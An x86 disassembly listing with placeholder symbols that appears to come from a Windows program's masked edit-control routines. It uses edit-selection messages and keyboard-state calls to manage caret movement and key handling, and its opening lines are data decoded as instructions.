add [ eax + 0x4f0a0032 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc esp
jb r-xdata
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
sbb al [ ecx ]
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
dec ebx
jns r-xdata
sub al 0x1a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb al [ ecx ]
rol [ ecx ] 0x0
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
fadd [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
fadd [ ebx ]
mov eax 0xe00043d8
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or [ edi + 0x6e ] ecx
sbb al [ ecx ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ esi ] al
dec edi
outsb
add [ eax + 0x4f070036 ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
inc ebp
js r-xdata
xlat
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add al [ eax ]
add [ ecx + rw-data ] ah
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
push ebp
jo r-xdata
arpl [ ebx - 0x24 ] bp
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
inc esp
outsd
ja r-xdata
dec edi
outsb
push ebx
je r-xdata
nop
xlat
inc ebx
add al ah
add [ eax ] al
jmp eax
insb
fadd [ ebx ]
call 0xffffffffe9456d33
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003a ] al
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec ebp
outsd
jne r-xdata
fadd [ ebx ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
inc ebp
outsb
inc esp
jb r-xdata
fiadd [ ebx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
fiadd [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x24 ] bp
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003d ] al
outsb
fild [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
jb r-xdata
or al bl
inc ebx
add al bl
add [ eax ] al
mov [ ebx + ebx * 8 + 0x7ae80f74 ] 0xc8
stc
jmp [ edi + ecx * 4 + 0x5 ]
jb r-xdata
mov eax ebx
call sub_4673e4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_447bb0
xor eax 0x8bfffe0d
retn
inc esp
jb r-xdata
inc esp
outsd
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
mov ebx 0x23c
add [ ebp + 0xc ] dh
nop
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_467ac0
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_467d58
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_467874
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_467e28
sub_466e08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43a7a4
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_466e5c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_4673e4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_447bb0
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_467ac0
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_467d58
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_467874
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_467e28
sub_466f3c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_4673e4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_447c98
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_467874
sub_466f8c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_447d68
mov eax esi
call sub_4673e4
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_4678e8
mov [ ebx ] 0x0
sub_466fe4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443f34
mov eax ebx
call sub_4673e4
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_4675bc
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_467874
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_467064
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4670c0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4670cc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4044a0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4670c7
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax esi
call sub_404554
mov edx eax
mov eax ebx
call sub_44252c
mov eax ebx
call sub_467874
sub_4670e0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_467120
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_467130
mov eax [ ebp - 0x4 ]
call sub_404354
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467127
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_467130
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4671b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4673e4
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4670cc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_4681f4
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_442550
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4671bb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_4681ac
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4040e8
sub_4671c4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4672ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4673e4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40412c
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_442580
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4681ac
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_40412c
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_4660d8
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40412c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4672c1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_467064
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
sub_4672c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4673e4
test al al
jne r-xdata
mov eax ebx
call sub_43ab38
mov dx 0x2e
mov eax ebx
call sub_467e28
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4672fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4673d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4673e4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4673dd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
call sub_432920
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_432920
lea edx [ ebp - 0x4 ]
call sub_432568
call sub_432920
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4675bc
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4670cc
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_4688e0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_467064
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_468978
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_467064
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_467604
sub_4673f4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4674a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4670cc
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4681f4
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_4040e8
mov eax esi
call sub_404354
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_465e68
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_465cec
mov [ ebx + 0x22c ] al
mov eax esi
call sub_465d70
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4681ac
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40412c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_467064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4674b0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4040b8
retn
sub_4674b8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_4044a0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_4673f4
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_4675bc
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_43a8cc
mov eax ebx
call sub_4673e4
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_467064
mov eax ebx
call sub_449088
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_448d84
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_43a8cc
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_467604
sub_46758c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4673e4
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_43a8cc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43a8cc
pop esi
pop ebx
retn
sub_4675bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4675e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_467604
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467864
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4673e4
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_4670cc
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40c670
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_4670cc
mov eax [ ebp - 0x218 ]
call sub_404354
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_4670cc
mov eax [ ebp - 0x210 ]
call sub_404354
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4675e0
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_4670cc
mov eax [ ebp - 0x21c ]
call sub_404354
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_4670cc
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4675e0
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46786b
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_4040b8
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403540
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_4677d2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403540
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403540
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_467874
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_449088
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4673e4
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_4675bc
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_467604
sub_4678c0
push ebx
mov ebx eax
mov eax ebx
call sub_43a910
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_467064
xor edx edx
mov eax ebx
call sub_43a948
sub_4678e8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_467aad
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467ab4
lea eax [ ebp - 0x10 ]
call sub_404094
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4675bc
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_467e28
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_467cfc
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_467604
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4683c8
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_448d84
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_40427c
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402c28
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402bf8
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_4042f8
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4675e0
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_404554
push eax
push 0x0
push 0xc2
mov eax esi
call sub_448d84
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4675bc
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_467ca8
sub_467ac0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467c9a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467ca1
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4040b8
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4675bc
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_467ce0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4670cc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4675e0
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4670cc
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_467604
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_467604
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_4675e0
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_467ca8
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_467ca8
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_467ca8
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_467ce0
jmp r-xdata
sub_467ca8
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_467cfc
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_465f18
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_467604
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_467cfc
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_465f18
test al al
jne r-xdata
inc ebx
sub_467d24
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
